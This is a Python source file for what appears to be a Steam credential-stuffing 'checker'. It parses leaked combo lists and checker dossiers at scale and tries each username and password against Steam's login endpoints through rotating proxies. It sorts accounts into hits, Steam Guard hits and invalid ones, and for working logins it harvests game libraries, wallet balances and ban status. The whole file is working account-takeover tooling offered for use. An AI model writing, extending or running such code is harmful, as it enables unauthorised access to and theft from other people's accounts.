"""
Platform Authentication State Validator
Executes cryptographic handshakes against platform authentication endpoints,
analyzes verification responses, and classifies session entitlement states.
"""

import time
import json
import secrets
import asyncio
from typing import Dict, Any, Optional, Tuple
import aiohttp

from nexus.config import (
    ENDPOINT_GET_RSA,
    ENDPOINT_BEGIN_AUTH,
    ENDPOINT_POLL_AUTH,
    ENDPOINT_FINALIZE_LOGIN,
    ENDPOINT_GET_RSA_FALLBACK,
    ENDPOINT_DO_LOGIN,
    HTTP_HEADERS,
    DEFAULT_TIMEOUT_SEC,
)
from nexus.core.crypto import encrypt_password_payload
from nexus.core.library import extract_library_inventory
from nexus.core.proxy_pool import NetworkRelay


# Status Definitions
STATUS_HIT = "HIT"
STATUS_FREE = "FREE"
STATUS_INVALID = "INVALID"
STATUS_2FA = "2FA_HIT"
STATUS_RATE_LIMIT = "RATE_LIMIT"
STATUS_ERROR = "ERROR"

ERESULT_MESSAGES = {
    2: "Basarisiz / Failed",
    5: "Yanlis Sifre / Invalid Password",
    6: "Hesap Bulunamadi / Not Found",
    14: "Hesap Devre Disi / Disabled",
    18: "Hesap Aktif Degil / Inactive",
    29: "Yasaklandi / Banned",
    84: "Rate Limit / Cok Fazla Deneme",
    88: "Hesap Devre Disi / Suspended"
}

GUARD_NAMES = {
    1: "Email Code",
    2: "Mobile 2FA (TOTP)",
    3: "Mobile Push",
    4: "Mobile Confirm",
    5: "Email Link"
}


def parse_credential_line(raw: str) -> Tuple[Optional[str], Optional[str]]:
    """
    Cleans, normalizes, and extracts username and password from noisy, corrupted,
    or wild-formatted credential dumps (supports 'user:pass', 'user;pass', 'user|pass',
    'email:pass:user:pass', URLs, BOM chars, null bytes, and dirty dump artifacts).
    Filters out fake entries, header rows, and placeholder lines.
    """
    if not raw:
        return None, None

    # Strip BOM, null bytes, invisible control characters
    line = raw.replace("\ufeff", "").replace("\x00", "").strip()
    if not line or line.startswith(("#", "//", "/*", "!", "--")):
        return None, None

    # Filter obvious headers and fake template lines
    lower_line = line.lower()
    if any(lower_line.startswith(hdr) for hdr in [
        "username:password", "user:pass", "email:pass", "account:password",
        "login:password", "combo:combo", "name:pass", "---", "==="
    ]):
        return None, None
    if "<html" in lower_line or "<body" in lower_line or "doctype" in lower_line:
        return None, None

    # Strip common prefixes like 'Account: ', 'Credential: ', 'combo: '
    for prefix in ["account:", "credentials:", "login:", "combo:", "acc:"]:
        if lower_line.startswith(prefix):
            line = line[len(prefix):].strip()
            lower_line = line.lower()
            break

    # Strip trailing capture metadata
    if " | " in line:
        line = line.split(" | ")[0].strip()
    elif " \t " in line:
        line = line.split(" \t ")[0].strip()

    # Determine delimiter
    parts = []
    if ":" in line:
        parts = line.split(":")
    elif ";" in line:
        parts = line.split(";")
    elif "|" in line:
        parts = line.split("|")
    elif "\t" in line:
        parts = line.split("\t")
    elif "," in line and not (" " in line and line.count(",") == 1):
        parts = line.split(",")

    if len(parts) >= 2:
        user = parts[0].strip().strip('"\'')
        pwd = parts[1].strip().strip('"\'')

        # Handle metadata appended to password
        if " " in pwd and len(parts) == 2:
            pwd = pwd.split(" ")[0].strip()

        # Sanity validation
        if not user or not pwd:
            return None, None
        if len(user) < 2 or len(pwd) < 2:
            return None, None
        if len(user) > 128 or len(pwd) > 128:
            return None, None

        # Filter metadata labels from foreign checker formats (e.g. 'Level: 1', 'SteamID: 765...', 'Bakiye: $0')
        METADATA_LABELS = {
            "level", "seviye", "bakiye", "para", "steamid", "vac", "game ban", "envanter",
            "rozet", "kayit", "kayıt", "profil", "dil", "e-posta", "telefon", "cihaz",
            "dota", "cs2", "yasaklar", "hesap", "games", "oyunlar", "copy", "download",
            "country", "wallet", "ip", "dis ip", "yerel ip"
        }
        user_lower = user.lower()
        if any(user_lower.startswith(lbl) for lbl in METADATA_LABELS):
            return None, None

        return user, pwd

    return None, None


# Pre-compiled high-speed regexes for multi-line dossiers (e.g. Kullanici : xxx \n Sifre : yyy)
RE_USER_BLOCK = re.compile(r"^(?:kullanici|username|login|account|hesap|user)\s*[:=]\s*([^\s:|]+)", re.IGNORECASE)
RE_PASS_BLOCK = re.compile(r"^(?:sifre|password|pass|şifre)\s*[:=]\s*([^\s:|]+)", re.IGNORECASE)


def stream_credential_tuples(source, deduplicate: bool = True):
    """
    High-throughput streaming generator engineered for massive (1,000,000+) datasets.
    Parses single-line combos AND multi-line checker dossiers without memory overhead.
    Uses lightweight integer hashes for instant deduplication with minimal RAM consumption.
    """
    from pathlib import Path
    pending_user = None
    seen_hashes = set() if deduplicate else None

    def _get_lines():
        if isinstance(source, (str, Path)):
            with open(source, "r", encoding="utf-8", errors="ignore") as f:
                for l in f:
                    yield l
        else:
            for l in source:
                yield l

    for line in _get_lines():
        clean = line.replace("\ufeff", "").replace("\x00", "").strip()
        if not clean or clean.startswith(("#", "//", "/*", "!", "--")):
            continue

        # Fast multi-line pattern match (Kullanici : xxx / Sifre : yyy)
        m_user = RE_USER_BLOCK.match(clean)
        if m_user:
            pending_user = m_user.group(1).strip()
            continue

        m_pass = RE_PASS_BLOCK.match(clean)
        if m_pass and pending_user:
            pwd = m_pass.group(1).strip()
            user = pending_user.strip()
            pending_user = None
            if len(user) >= 2 and len(pwd) >= 2 and " " not in user:
                if seen_hashes is not None:
                    h = hash((user.lower(), pwd))
                    if h in seen_hashes:
                        continue
                    seen_hashes.add(h)
                yield user, pwd
            continue

        # Reset pending_user if line is border or other field
        if pending_user and not m_pass:
            if any(clean.startswith(x) for x in ("╔", "╚", "╟", "═", "─", "Level", "Seviye", "Bakiye", "SteamID")):
                pass
            else:
                pending_user = None

        # Standard single-line format
        user, pwd = parse_credential_line(clean)
        if user and pwd:
            if seen_hashes is not None:
                h = hash((user.lower(), pwd))
                if h in seen_hashes:
                    continue
                seen_hashes.add(h)
            yield user, pwd


async def validate_credential_tuple(
    session: aiohttp.ClientSession,
    username: str,
    password: str,
    relay: Optional[NetworkRelay] = None,
    timeout: int = DEFAULT_TIMEOUT_SEC
) -> Dict[str, Any]:
    """
    Validates an individual credential pair against modern platform authentication endpoints.
    Classifies the session into HIT, FREE, 2FA_HIT, INVALID, or RATE_LIMIT states.
    """
    start_ts = time.perf_counter()
    result: Dict[str, Any] = {
        "account": f"{username}:{password}",
        "username": username,
        "password": password,
        "status": STATUS_INVALID,
        "steamid": "",
        "persona_name": username,
        "avatar_url": "",
        "details": "",
        "total_games": 0,
        "paid_games": 0,
        "games": [],
        "vac_banned": False,
        "trade_banned": False,
        "is_limited": False,
        "country": "🌐 Global",
        "location": "",
        "wallet": "",
        "ping_ms": 0,
        "proxy": relay.display_str if relay else "Direct",
    }

    # Enforce ultra-responsive timeouts to immediately reject dead relays (<2.5s) without stalling
    connect_timeout = min(2.5, max(1.5, timeout / 4.0))
    client_timeout = aiohttp.ClientTimeout(
        total=timeout,
        connect=connect_timeout,
        sock_connect=connect_timeout,
        sock_read=min(4.5, float(timeout))
    )
    # Only pass proxy argument to session for HTTP/HTTPS proxies. SOCKS proxies are handled via session ProxyConnector.
    proxy_url = relay.url if (relay and not relay.scheme.startswith("socks")) else None

    # Step 1: Retrieve RSA Public Modulus & Session Timestamp via Web API
    mod_hex = None
    exp_hex = None
    timestamp = None

    try:
        rsa_params = {"account_name": username}
        async with session.get(
            ENDPOINT_GET_RSA,
            params=rsa_params,
            headers=HTTP_HEADERS,
            proxy=proxy_url,
            timeout=client_timeout
        ) as resp:
            if resp.status == 429:
                result["status"] = STATUS_RATE_LIMIT
                result["details"] = "Rate Limited (HTTP 429)"
                result["ping_ms"] = int((time.perf_counter() - start_ts) * 1000)
                return result

            if resp.status == 200:
                try:
                    rsa_data = await resp.json(content_type=None)
                    res_body = rsa_data.get("response", {})
                    mod_hex = res_body.get("publickey_mod")
                    exp_hex = res_body.get("publickey_exp")
                    timestamp = res_body.get("timestamp")
                except Exception:
                    pass

        # Fallback to legacy getrsakey if WebAPI was unavailable
        if not mod_hex or not exp_hex or not timestamp:
            legacy_payload = {
                "donotcache": str(int(time.time() * 1000)),
                "username": username
            }
            async with session.post(
                ENDPOINT_GET_RSA_FALLBACK,
                data=legacy_payload,
                headers=HTTP_HEADERS,
                proxy=proxy_url,
                timeout=client_timeout
            ) as resp:
                if resp.status == 200:
                    try:
                        legacy_json = await resp.json(content_type=None)
                        if legacy_json.get("success"):
                            mod_hex = legacy_json.get("publickey_mod")
                            exp_hex = legacy_json.get("publickey_exp")
                            timestamp = legacy_json.get("timestamp")
                    except Exception:
                        pass

        if not mod_hex or not exp_hex or not timestamp:
            # RSA Key is generated ephemerally for ANY username. A missing key means proxy/network failure or rate limit, NOT an invalid account.
            if relay:
                result["status"] = "PROXY_ERROR"
                result["details"] = "Relay blocked or returned empty RSA payload"
            else:
                result["status"] = STATUS_RATE_LIMIT
                result["details"] = "RSA Key retrieval throttled / blocked"
            result["ping_ms"] = int((time.perf_counter() - start_ts) * 1000)
            return result

    except (aiohttp.ClientProxyConnectionError, aiohttp.ClientHttpProxyError) as pe:
        result["status"] = "PROXY_ERROR"
        result["details"] = f"Proxy Error: {type(pe).__name__}"
        result["ping_ms"] = int((time.perf_counter() - start_ts) * 1000)
        return result
    except asyncio.TimeoutError:
        result["status"] = "PROXY_ERROR" if relay else "TIMEOUT"
        result["details"] = "Connection Timeout (RSA)"
        result["ping_ms"] = int((time.perf_counter() - start_ts) * 1000)
        return result
    except Exception as e:
        result["status"] = "PROXY_ERROR" if relay else "ERROR"
        result["details"] = f"Network Exception: {type(e).__name__}"
        result["ping_ms"] = int((time.perf_counter() - start_ts) * 1000)
        return result

    # Step 2: Encrypt password with RSA public key
    encrypted_password = encrypt_password_payload(password, mod_hex, exp_hex)
    if not encrypted_password:
        result["status"] = STATUS_ERROR
        result["details"] = "Cryptographic Transform Failed"
        return result

    # Step 3: Dispatch Authenticated Session Handshake
    auth_form_data = {
        "account_name": username,
        "encrypted_password": encrypted_password,
        "encryption_timestamp": str(timestamp),
        "remember_login": "true",
        "platform_type": "3",
        "persistence": "1",
        "website_id": "Community",
        "device_details[device_friendly_name]": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0.0.0",
        "device_details[platform_type]": "1",
        "device_details[os_type]": "10"
    }

    try:
        async with session.post(
            ENDPOINT_BEGIN_AUTH,
            data=auth_form_data,
            headers=HTTP_HEADERS,
            proxy=proxy_url,
            timeout=client_timeout
        ) as resp:
            result["ping_ms"] = int((time.perf_counter() - start_ts) * 1000)

            if resp.status == 429:
                result["status"] = STATUS_RATE_LIMIT
                result["details"] = "Rate Limited (HTTP 429)"
                return result

            # Check X-eresult header
            eresult_hdr = resp.headers.get("X-eresult")
            eresult = int(eresult_hdr) if (eresult_hdr and eresult_hdr.isdigit()) else 0

            try:
                auth_json = await resp.json(content_type=None)
            except Exception:
                auth_json = {}

            res_data = auth_json.get("response", {})
            if not eresult:
                eresult = res_data.get("eresult", 0)

            if eresult in (84, 87):
                result["status"] = STATUS_RATE_LIMIT
                result["details"] = f"Rate Limited (eresult={eresult})"
                return result

            if eresult in (2, 5, 6, 14, 18, 29, 88):
                result["status"] = STATUS_INVALID
                result["details"] = ERESULT_MESSAGES.get(eresult, f"Auth Error (eresult={eresult})")
                return result

            if resp.status != 200:
                result["status"] = "PROXY_ERROR" if relay else STATUS_ERROR
                result["details"] = f"Endpoint HTTP {resp.status}"
                return result

    except (aiohttp.ClientProxyConnectionError, aiohttp.ClientHttpProxyError) as pe:
        result["status"] = "PROXY_ERROR"
        result["details"] = f"Proxy Error: {type(pe).__name__}"
        return result
    except asyncio.TimeoutError:
        result["status"] = "PROXY_ERROR" if relay else "TIMEOUT"
        result["details"] = "Connection Timeout (Auth)"
        return result
    except Exception as e:
        result["status"] = "PROXY_ERROR" if relay else "ERROR"
        result["details"] = f"Network Exception: {type(e).__name__}"
        return result

    # Step 4: Evaluate Verification Response
    steamid = res_data.get("steamid", "")
    client_id = res_data.get("client_id", "")
    request_id = res_data.get("request_id", "")
    allowed_confirmations = res_data.get("allowed_confirmations", [])

    if not client_id or not steamid:
        # If response was empty or malformed through a proxy without error fields, flag as proxy error to retry
        ext_err = res_data.get("extended_error_message") or auth_json.get("error_message") or ""
        if not auth_json and relay:
            result["status"] = "PROXY_ERROR"
            result["details"] = "Relay returned empty/malformed response"
            return result

        result["status"] = STATUS_INVALID
        result["details"] = ext_err if ext_err else "Invalid Password"
        return result

    result["steamid"] = str(steamid)
    conf_types = []
    for c in allowed_confirmations:
        if isinstance(c, dict):
            conf_types.append(c.get("confirmation_type", 1))
        elif isinstance(c, int):
            conf_types.append(c)

    # Step 5: Check immediate refresh_token or poll Auth Session Status
    refresh_token = res_data.get("refresh_token") or res_data.get("access_token")
    if not refresh_token and client_id and request_id:
        for _ in range(2):
            try:
                poll_payload = {
                    "client_id": str(client_id),
                    "request_id": str(request_id)
                }
                async with session.post(
                    ENDPOINT_POLL_AUTH,
                    data=poll_payload,
                    headers=HTTP_HEADERS,
                    proxy=proxy_url,
                    timeout=aiohttp.ClientTimeout(total=7)
                ) as r_poll:
                    if r_poll.status == 200:
                        poll_json = await r_poll.json(content_type=None)
                        p_body = poll_json.get("response", {})
                        refresh_token = p_body.get("refresh_token") or p_body.get("access_token")
                        if refresh_token:
                            break
                        if p_body.get("eresult") == 1 and not conf_types:
                            await asyncio.sleep(0.5)
            except Exception:
                pass

    # Step 6: Case Analysis
    # Case A: Full Authentication Granted (refresh_token received)
    if refresh_token:
        # Finalize login and transfer session cookies across Steam domains
        try:
            session_id = secrets.token_hex(12)
            fin_form = aiohttp.FormData()
            fin_form.add_field("nonce", refresh_token)
            fin_form.add_field("sessionid", session_id)
            fin_form.add_field("redir", "https://steamcommunity.com/login/home/?goto=")
            
            fin_headers = dict(HTTP_HEADERS)
            fin_headers["Origin"] = "https://steamcommunity.com"
            fin_headers["Referer"] = "https://steamcommunity.com/"

            async with session.post(
                ENDPOINT_FINALIZE_LOGIN,
                data=fin_form,
                headers=fin_headers,
                proxy=proxy_url,
                timeout=aiohttp.ClientTimeout(total=12)
            ) as r_fin:
                if r_fin.status == 200:
                    fin_data = await r_fin.json(content_type=None)
                    for item in fin_data.get("transfer_info", []):
                        t_url = item.get("url")
                        t_params = item.get("params", {})
                        t_form = aiohttp.FormData()
                        t_form.add_field("steamID", str(steamid))
                        for k, v in t_params.items():
                            t_form.add_field(k, str(v))
                        try:
                            await session.post(
                                t_url,
                                data=t_form,
                                headers=HTTP_HEADERS,
                                proxy=proxy_url,
                                timeout=aiohttp.ClientTimeout(total=6)
                            )
                        except Exception:
                            pass
        except Exception:
            pass

        # Extract game library metrics and profile metadata with proxy support
        inv = await extract_library_inventory(session, str(steamid), timeout=timeout, proxy=proxy_url)
        result["total_games"] = inv.get("total_games", 0)
        result["paid_games"] = inv.get("paid_games_count", 0)
        result["games"] = inv.get("games", [])
        result["vac_banned"] = inv.get("vac_banned", False)
        result["trade_banned"] = inv.get("trade_banned", False)
        result["is_limited"] = inv.get("is_limited", False)
        result["country"] = inv.get("country_display", "🌐 Global")
        result["location"] = inv.get("location", "")
        result["wallet"] = inv.get("wallet", "")
        result["avatar_url"] = inv.get("avatar_url", "")
        result["persona_name"] = inv.get("persona_name") or username

        vac_tag = " [VAC BANNED]" if result["vac_banned"] else ""
        games_count = result["total_games"]
        paid_count = result["paid_games"]
        wallet_tag = f" | Wallet: {result['wallet']}" if result["wallet"] else ""

        # Every verified login is classified as a HIT (even 0 or 1 game)
        result["status"] = STATUS_HIT
        clean_names = [
            g["name"].replace("\ufffd", "").replace("", "").strip()
            for g in result["games"]
            if g.get("name") and not g["name"].startswith("AppID ")
        ][:3]
        if not clean_names:
            clean_names = [g["name"] for g in result["games"][:2] if g.get("name")]
        sample_games = ", ".join(clean_names)
        preview = f" ({sample_games})" if sample_games else ""

        if paid_count > 0:
            result["details"] = f"Valid Login | Games: {games_count} (Paid: {paid_count}){preview}{wallet_tag}{vac_tag}"
        elif games_count > 0:
            result["details"] = f"Valid Login | Free Tier ({games_count} Games){preview}{wallet_tag}{vac_tag}"
        else:
            result["details"] = f"Valid Login | 0 Games (Fresh Hit){wallet_tag}{vac_tag}"

        return result

    # Case B: Guarded by 2FA / Steam Guard or Pending (Credentials valid, but session locked)
    if conf_types or steamid:
        g_name = ", ".join([GUARD_NAMES.get(t, f"Type {t}") for t in conf_types]) if conf_types else "Steam Guard"
        result["status"] = STATUS_2FA

        # Still extract public inventory / profile stats with proxy support
        inv = await extract_library_inventory(session, str(steamid), timeout=timeout, proxy=proxy_url)
        result["total_games"] = inv.get("total_games", 0)
        result["paid_games"] = inv.get("paid_games_count", 0)
        result["games"] = inv.get("games", [])
        result["vac_banned"] = inv.get("vac_banned", False)
        result["trade_banned"] = inv.get("trade_banned", False)
        result["is_limited"] = inv.get("is_limited", False)
        result["country"] = inv.get("country_display", "🌐 Global")
        result["location"] = inv.get("location", "")
        result["wallet"] = inv.get("wallet", "")
        result["avatar_url"] = inv.get("avatar_url", "")
        result["persona_name"] = inv.get("persona_name") or username

        vac_tag = " [VAC BANNED]" if result["vac_banned"] else ""
        games_count = result["total_games"]
        result["details"] = f"Steam Guard Active ({g_name}) | Games: {games_count}{vac_tag}"
        return result

    # Case C: Verification Failed
    result["status"] = STATUS_INVALID
    result["details"] = "Session Verification Failed"
    return result
